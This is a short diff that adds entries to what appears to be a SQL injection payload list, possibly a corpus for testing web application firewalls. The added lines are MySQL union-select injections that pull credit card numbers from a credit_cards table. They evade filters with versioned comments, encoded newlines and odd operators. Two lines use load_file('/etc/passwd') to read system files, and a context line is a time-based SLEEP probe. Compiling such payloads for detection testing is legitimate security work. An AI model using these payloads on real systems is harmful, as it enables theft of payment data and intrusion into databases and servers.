@@ -82,3 +82,13 @@ TRUE DIV(SELECT ((ORD(LEFT
 1001 union/*/**/*/select userid, ccnumber, '3', '4' from credit_cards
 1001 or 'A' = 'B' union select userid, ccnumber, '3', '4' from credit_cards
 '6334588?'||SLEEP(3)&&'1
+1001*/*!50000(1)union*/all(select 1,ccnumber,3,4 from credit_cards)
+1001*/*!50000(1)union select 1,ccnumber,load_file('/etc/passwd'),4 from credit_cards*/
+(1001)union select-1,ccnumber,3,4 from credit_cards
+(1001)union select (1),ccnumber,3,4 from credit_cards
+(1001)union select @a,ccnumber,3,4 from credit_cards
+1001-\N%0aunion select 1,ccnumber,3,4 from credit_cards
+1001 sounds like '1001' union select 1,ccnumber,3,4 from credit_cards
+1001-'text' union select 1,ccnumber,3,4 from credit_cards
+1001%2b@a union select 1,load_file('/etc/passwd'),3,4 from credit_cards
+
